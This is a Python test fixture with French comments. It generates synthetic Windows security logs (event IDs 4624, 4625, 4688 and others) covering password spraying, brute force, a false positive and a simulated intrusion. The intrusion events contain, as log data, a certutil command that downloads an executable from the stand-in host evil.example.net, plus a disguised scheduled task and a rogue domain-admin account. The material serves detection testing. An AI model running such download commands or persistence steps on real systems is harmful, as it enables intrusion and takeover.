"""Jeu de logs synthétique (scénario différent de logs_test.json) pour les tests.

Date : 2026-05-20, UTC. Les événements sont renvoyés dans le désordre.
"""
import base64
import json
import tempfile
from datetime import datetime, timedelta, timezone

IP_SPRAY_A = "198.51.100.23"
IP_SPRAY_B = "192.0.2.88"
IP_BRUTE = "203.0.113.200"
IP_FP = "10.8.0.50"
B64_GET_PROCESS = base64.b64encode("Get-Process".encode("utf-16-le")).decode("ascii")

_JOUR = datetime(2026, 5, 20, tzinfo=timezone.utc)


def _evt(ts, event_id, host, account, src_ip=None, logon_type=None, details=None):
    """Construit un événement au format de logs_test.json (result="success" partout)."""
    return {
        "timestamp": ts,
        "event_id": event_id,
        "host": host,
        "account": account,
        "src_ip": src_ip,
        "logon_type": logon_type,
        "result": "success",
        "details": details if details is not None else {},
    }


def _hms(h, m, s=0):
    """Horodatage ISO 8601 UTC (suffixe Z) pour le jour du jeu."""
    t = _JOUR + timedelta(hours=h, minutes=m, seconds=s)
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


def _rafale(h, m, n, pas_s, host, comptes, src_ip):
    """n échecs 4625 espacés de pas_s secondes, comptes pris en boucle."""
    return [
        _evt(_hms(h, m, i * pas_s), 4625, host, comptes[i % len(comptes)], src_ip, 3)
        for i in range(n)
    ]


def construire_jeu():
    """Renvoie la liste de dicts du scénario, volontairement dans le désordre."""
    evts = [
        # Légitime
        _evt(_hms(7, 55), 4624, "WKS-101", "p.alpha", "10.8.0.11", 2),
        _evt(_hms(9, 30), 4688, "WKS-101", "p.alpha", details={
            "process": "chrome.exe", "parent_process": "explorer.exe",
            "command_line": "chrome.exe"}),
    ]
    # Faux positif : compte de service interne
    evts += _rafale(8, 0, 12, 30, "SRV-WEB01", ["svc_web"], IP_FP)
    # Spray A (abouti)
    evts += _rafale(9, 0, 12, 40, "SRV-FILE02",
                    ["u.un", "u.deux", "u.trois", "u.quatre", "u.cinq", "u.six"],
                    IP_SPRAY_A)
    # Intrusion
    evts += [
        _evt(_hms(9, 12), 4624, "SRV-FILE02", "u.trois", IP_SPRAY_A, 3),
        _evt(_hms(9, 14), 4688, "SRV-FILE02", "u.trois", details={
            "process": "cmd.exe", "parent_process": "excel.exe",
            "command_line": "cmd.exe /c certutil -urlcache -f "
                            "http://evil.example.net/p.exe C:\\Temp\\p.exe"}),
        _evt(_hms(9, 16), 4698, "SRV-FILE02", "u.trois",
             details={"task_name": "\\OneDriveSyncHelper"}),
        _evt(_hms(9, 18), 4720, "SRV-FILE02", "u.trois",
             details={"new_account": "adm_tmp"}),
        _evt(_hms(9, 19), 4732, "SRV-FILE02", "u.trois",
             details={"group": "Admins du domaine", "member": "adm_tmp"}),
        _evt(_hms(9, 25), 4624, "WKS-205", "adm_tmp", "10.8.0.77", 10),
        _evt(_hms(9, 27), 4688, "WKS-205", "adm_tmp", details={
            "process": "powershell.exe", "parent_process": "explorer.exe",
            "command_line": "powershell.exe -enc " + B64_GET_PROCESS,
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"}),
    ]
    # Spray B (échoué)
    evts += _rafale(10, 0, 15, 30, "WKS-110",
                    ["v.a", "v.b", "v.c", "v.d", "v.e", "v.f", "v.g", "v.h"],
                    IP_SPRAY_B)
    # Force brute
    evts += _rafale(11, 0, 11, 20, "SRV-VPN01", ["administrateur"], IP_BRUTE)
    evts.reverse()
    return evts


def ecrire_jeu(evenements=None):
    """Écrit les événements (par défaut construire_jeu()) dans un JSON temporaire ; renvoie le chemin."""
    if evenements is None:
        evenements = construire_jeu()
    with tempfile.NamedTemporaryFile(
            "w", suffix=".json", delete=False, encoding="utf-8") as f:
        json.dump(evenements, f)
        return f.name


def chemin_jeu_synthetique():
    """Chemin d'un fichier JSON contenant le jeu synthétique complet."""
    return ecrire_jeu()
